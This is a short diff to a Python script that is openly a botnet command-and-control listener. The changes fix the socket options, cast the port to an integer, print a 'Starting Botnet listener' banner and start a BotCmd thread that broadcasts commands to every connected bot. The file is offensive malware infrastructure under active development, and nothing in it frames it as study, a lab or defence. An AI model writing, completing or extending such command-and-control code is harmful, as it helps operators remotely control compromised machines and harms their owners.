@@ -6,15 +6,23 @@ import os
 import threading
 import queue
 
+from BotCmd import BotCmd
+
+
 q = queue.Queue()
 socketThread = []
 
 def listener(lhost, lport, q):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
-    server.bind((lhost, lport))
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_address = (lhost, lport)
+    server.bind(server_address)
     server.listen(100)
+    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
 
+    # this thread is in charge to send the command to all the bots connected (stored in socket thread)
+    BotCmdThread = BotCmd(q,socketThread)
+    BotCmdThread.start()
 
 def main():
     if(len(sys.argv)<3):
@@ -22,7 +30,7 @@ def main():
     else:
         try:
             lhost = sys.argv[1]
-            lport = sys.argv[2]
+            lport = int(sys.argv[2])
             listener(lhost, lport, q)
         except Exception as ex:
             print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
